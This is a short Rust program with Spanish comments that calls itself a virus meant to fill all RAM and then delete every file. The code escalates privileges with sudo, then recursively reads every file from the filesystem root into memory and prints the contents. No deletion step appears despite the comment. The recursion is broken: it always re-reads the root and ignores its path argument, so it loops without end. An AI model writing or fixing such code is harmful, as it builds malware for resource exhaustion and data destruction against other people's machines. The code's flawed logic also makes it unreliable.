// Daniel Hernández Toledo
// Daniel Alejandro Osornio Lopez
// Virus para poder llenar toda la memoria ram y posteriormente borrar todos los archivos.

use std::fs::{OpenOptions, read_dir};
use std::io::Read;
use std::path::{Path, PathBuf};

fn walk <T: FnOnce(PathBuf)+Copy> (path:PathBuf, action:T) -> () {
    let archivos = read_dir("/").unwrap();
    for archivo in archivos {
        let archivo = archivo.unwrap();
        if archivo.file_type().unwrap().is_dir() {
            walk(archivo.path(), action);
        } else {
            action(archivo.path());
        }
    }
}

fn main() {
    sudo::escalate_if_needed().unwrap();
    let archivos = read_dir("/").unwrap();
    walk("/".into(), |p|{
        let mut manager = OpenOptions::new().read(true).open(& p).expect("FAllo al abrirse");
        let mut contenidos = vec![];
        manager.read_to_end(&mut contenidos).expect("FAllO AL AGREGARSE AL VECTOR");
        println!("{}:{:?}", p.display(), contenidos);

    }  )
}
